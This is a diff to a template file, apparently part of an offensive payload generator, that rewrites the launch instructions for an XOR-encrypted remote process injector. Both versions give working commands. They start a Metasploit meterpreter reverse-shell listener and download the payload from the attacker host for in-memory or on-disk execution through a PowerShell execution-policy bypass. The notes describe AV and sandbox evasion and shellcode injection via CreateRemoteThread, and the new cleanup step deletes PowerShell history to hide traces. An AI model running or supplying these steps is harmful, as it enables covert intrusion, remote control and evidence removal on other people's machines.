@@ -104,67 +104,40 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
   launch_instructions: |
-    XOR-Encrypted Remote Process Injection - Launch Instructions
+    Remote Process Injector, XOR - Launch Instructions
 
-    Step 1: Start Metasploit Listener
-
-    Start msfconsole and configure the handler:
-
+    Start Listener:
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Or manually in msfconsole:
+    In-Memory Execution:
+    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [Program]::Main('explorer'.Split())"
 
-    use exploit/multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST {{ lhost }}
-    set LPORT {{ lport }}
-    set ExitOnSession false
-    exploit -j
-
-    Step 2: Transfer Payload to Target
-
-    Transfer the generated executable to the target Windows system:
-
-    Using Python HTTP server
+    Traditional Execution (File-Based):
     python3 -m http.server 8080
-
-    On target (PowerShell):
-    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
-
-    Step 3: Execute on Target
-
-    Option A: Auto-injection (privilege-aware)
-    Simply run without arguments - automatically selects target based on privileges:
-    {{ output_file }}
-
-    Option B: Specify target process
-    Inject into a specific process by name:
-    {{ output_file }} explorer
-    {{ output_file }} notepad
-    {{ output_file }} svchost
-
-    Step 4: Verify Connection
-
-    Check your Metasploit console for incoming session:
-    Sending stage (200262 bytes) to [target_ip]
-    Meterpreter session 1 opened
+    On target: powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} notepad"
 
     Notes:
-
-    - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
-    - Includes NUMA-based sandbox detection
-    - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal)
-    - Creates remote thread in target process
+    - XOR encrypted with key: 0x{{ xor_key }} (basic AV evasion)
+    - NUMA-based sandbox detection (fails on sandboxes without NUMA support)
+    - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal user)
+    - Can specify custom target process as argument (e.g., notepad, explorer, chrome)
+    - Uses VirtualAllocEx to allocate RWX memory in target process
+    - WriteProcessMemory copies XOR-decrypted shellcode to target
+    - CreateRemoteThread executes payload in target process
     - EXITFUNC=thread ensures clean exit without crashing target process
+    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - Requires matching architecture (x64 payload → x64 process)
+    - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection
 
     Troubleshooting:
-
-    - If injection fails: Try different target process (notepad, chrome, etc.)
-    - If no connection: Check firewall rules on attacker machine
-    - If AV blocks: Consider additional obfuscation or packing
-    - Requires matching architecture (x64 payload for x64 process)
+    - Injection fails: Verify target process running with `Get-Process notepad` or `tasklist | findstr notepad`
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - Access Denied: May need administrative privileges for certain targets (system processes)
+    - Process crashes: Verify x64 payload for x64 process; check shellcode compatibility
+    - AV blocks: XOR weak; consider AES or additional obfuscation/packing
+    - NUMA check fails: Some VMs/sandboxes don't support NUMA; tool will exit
 
     Cleanup:
-
-    After testing, remove the payload:
-    Remove-Item {{ output_file }} -Force
+    On target:
+    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
